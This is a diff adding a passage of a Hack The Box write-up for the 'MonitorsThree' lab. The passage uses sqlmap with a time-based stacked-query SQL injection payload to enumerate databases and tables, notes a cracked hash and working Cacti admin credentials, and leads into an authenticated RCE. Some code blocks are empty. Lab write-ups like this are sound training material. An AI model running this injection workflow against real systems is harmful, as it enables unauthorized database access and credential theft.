@@ -307,3 +307,165 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 ```
 
 <br />
+
+We continue enumerating the available databases:
+
+<br />
+
+```bash
+❯ sqlmap -r request --dbs --batch
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.8.12#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:49:12 /2025-04-26/
+
+[20:49:12] [INFO] parsing HTTP request from 'request'
+[20:49:13] [INFO] resuming back-end DBMS 'mysql' 
+[20:49:13] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: username=admin';SELECT SLEEP(5)#
+---
+[20:49:13] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[20:49:13] [INFO] fetching database names
+[20:49:13] [INFO] fetching number of databases
+[20:49:13] [INFO] resumed: 2
+[20:49:13] [INFO] resumed: information_schema
+[20:49:13] [INFO] resumed: monitorsthree_db
+available databases [2]:
+[*] information_schema
+[*] monitorsthree_db
+
+[20:49:13] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/monitorsthree.htb'
+
+[*] ending @ 20:49:13 /2025-04-26/
+```
+
+<br />
+
+There are two `databases`.
+
+The most interesting is `monitorsthree_db` one, so let's enumerate its tables:
+
+<br />
+
+```bash
+❯ sqlmap -r request -D monitorsthree_db --tables --batch
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.8.12#stable}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:52:28 /2025-04-26/
+
+[20:52:28] [INFO] parsing HTTP request from 'request'
+[20:52:29] [INFO] resuming back-end DBMS 'mysql' 
+[20:52:29] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: username=admin';SELECT SLEEP(5)#
+---
+[20:52:29] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[20:52:29] [INFO] fetching tables for database: 'monitorsthree_db'
+[20:52:29] [INFO] fetching number of tables for database 'monitorsthree_db'
+[20:52:29] [INFO] resumed: 6
+[20:52:29] [INFO] resumed: invoices
+[20:52:29] [INFO] resumed: customers
+[20:52:29] [INFO] resumed: changelog
+[20:52:29] [INFO] resumed: tasks
+[20:52:29] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                        
+[20:52:38] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[20:53:55] [INFO] adjusting time delay to 1 second due to good response times
+invoice_ta
+[20:57:01] [ERROR] invalid character detected. retrying..
+[20:57:01] [WARNING] increasing time delay to 2 seconds
+sks
+[20:58:38] [INFO] retrieved: users
+Database: monitorsthree_db
+[6 tables]
++---------------+
+| changelog     |
+| customers     |
+| invoice_tasks |
+| invoices      |
+| tasks         |
+| users         |
++---------------+
+
+[21:01:19] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/monitorsthree.htb'
+
+[*] ending @ 21:01:19 /2025-04-26/
+```
+
+<br />
+
+We have 6 `tables`. 
+
+We will dump the `users` table:
+
+<br />
+
+```bash
+
+```
+
+<br />
+
+There are four `users` with their own hashes.
+
+<br />
+
+## Cracking Hashes:
+
+<br />
+
+If we enter this hashes on  [Crackstation](https://crackstation.net/), we are able to crack one of them:
+
+<br />
+
+
+
+<br />
+
+This password works for the Cacti login -> `admin/greencacti2001`
+
+<br />
+
+
+
+<br />
+
+## Cacti Authenticated RCE:
+
+<br />
+
+If we remember, before exploit the `SQL Injection`, we have founded a `RCE` in this Cacti version.
+
+<br />
